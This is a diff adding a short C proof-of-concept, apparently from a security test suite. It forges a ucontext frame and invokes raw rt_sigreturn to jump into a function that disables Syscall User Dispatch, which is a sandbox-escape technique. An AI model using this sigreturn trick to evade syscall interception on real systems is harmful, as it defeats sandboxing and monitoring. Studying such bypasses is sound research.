@@ -1,0 +1,42 @@
+#define _GNU_SOURCE
+#include <signal.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <ucontext.h>
+
+#include "_libattack.h"
+
+
+#define ALTSTACK_SIZE (1024*1024*32)
+#define PAGE_SIZE (4096)
+#define PAGE_MASK (~(PAGE_SIZE - 1))
+
+
+void win() {
+    disable_sud();
+    sud_test();
+    exit(0);
+}
+
+int main() {
+    char *stack = (char*)malloc(ALTSTACK_SIZE + PAGE_SIZE*2);
+    stack = (char*)((uint64_t)(stack + PAGE_SIZE) & PAGE_MASK);
+
+    ucontext_t* ucontext = ( ucontext_t*)calloc(sizeof(ucontext_t)+4096, 1);
+    ucontext->uc_mcontext.fpregs = (fpregset_t)(((char*)&(ucontext->__fpregs_mem))+24);
+    ucontext->uc_mcontext.gregs[REG_RIP] = (uint64_t)win;
+    ucontext->uc_mcontext.gregs[REG_CSGSFS] = ((uint64_t)0x33);
+    ucontext->uc_mcontext.gregs[REG_RSP] = (uint64_t)(stack + ALTSTACK_SIZE - PAGE_SIZE);
+
+    printf("starting sigreturn");
+    asm volatile (
+        "mov %0, %%rsp;" 
+        "mov $15, %%rax;"
+        "syscall\n"
+        :
+        : "r" (ucontext)
+    );
+
+    return 0;
+}
